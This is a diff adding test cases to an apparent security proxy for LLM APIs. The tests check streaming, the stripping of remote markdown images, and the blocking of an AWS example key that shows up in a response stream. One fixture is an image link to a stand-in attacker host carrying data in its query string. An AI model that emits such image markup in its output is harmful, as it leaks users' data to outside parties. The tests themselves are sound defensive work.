@@ -124,5 +124,49 @@ try:
 except anthropic.PermissionDeniedError as e:
     check("anthropic: an AWS key -> PermissionDeniedError", error_code(e) == "SENSITIVE_DATA", str(e.body))
 
+# --- Streaming and response controls (M4) -----------------------------------------------------
+
+# The AWS example key reversed: the request does not carry the key, and the mock answers with
+# it (MOCK_REPLY_REVERSED), so this tests response scanning.
+REVERSED_KEY = [{"role": "user", "content": "MOCK_REPLY_REVERSED: " + "ELPMAXE7NND" + "OFSOIAIKA"}]
+IMAGE = [{"role": "user", "content": "MOCK_REPLY: Mira ![x](https://attacker.test/p?d=abc) fin"}]
+
+
+def openai_stream_text(messages):
+    stream = openai_client(KEY).chat.completions.create(
+        model="gpt-4.1-mini", messages=messages, stream=True
+    )
+    return "".join(chunk.choices[0].delta.content or "" for chunk in stream if chunk.choices)
+
+
+def anthropic_stream_text(messages):
+    with anthropic_client(api_key=KEY).messages.stream(
+        model="claude-sonnet-5-5", max_tokens=16, messages=messages
+    ) as stream:
+        return "".join(stream.text_stream)
+
+
+text = openai_stream_text(MESSAGES)
+check("openai: streamed completion", text == "echo: hola", text)
+text = anthropic_stream_text(MESSAGES)
+check("anthropic: streamed message", text == "echo: hola", text)
+
+text = openai_stream_text(IMAGE)
+check("openai: a remote image is removed from the stream", text == "Mira [image removed] fin", text)
+text = anthropic_stream_text(IMAGE)
+check("anthropic: a remote image is removed from the stream", text == "Mira [image removed] fin", text)
+
+try:
+    openai_stream_text(REVERSED_KEY)
+    check("openai: a key in the response stream is cut", False, "no error raised")
+except openai.APIError as e:
+    check("openai: a key in the response stream -> APIError", error_code(e) == "SENSITIVE_DATA", str(e.body))
+
+try:
+    anthropic_stream_text(REVERSED_KEY)
+    check("anthropic: a key in the response stream is cut", False, "no error raised")
+except anthropic.APIStatusError as e:
+    check("anthropic: a key in the response stream -> APIStatusError", error_code(e) == "SENSITIVE_DATA", str(e.body))
+
 print(f"\n{'all checks passed' if failures == 0 else f'{failures} check(s) failed'}")
 sys.exit(1 if failures else 0)
